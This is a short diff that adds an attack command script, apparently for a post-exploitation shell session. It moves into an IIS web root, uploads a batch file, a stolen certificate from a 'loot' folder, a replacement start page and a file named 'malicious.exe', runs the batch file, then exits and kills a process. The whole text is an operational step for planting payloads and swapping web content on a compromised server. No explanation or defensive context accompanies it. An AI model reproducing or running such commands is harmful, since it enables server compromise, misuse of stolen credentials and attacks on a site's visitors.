@@ -1,0 +1,11 @@
+cd C:\
+cd inetpub
+cd wwwroot
+upload /root/2fassassin/cert/transport/instruction/server.bat
+upload /root/2fassassin/loot/ServerCert.pfx
+upload /root/2fassassin/http/iisstart.htm
+upload /root/2fassassin/binary/malicious.exe
+execute -f server.bat
+exit
+exit -y
+kill -s 2 pid
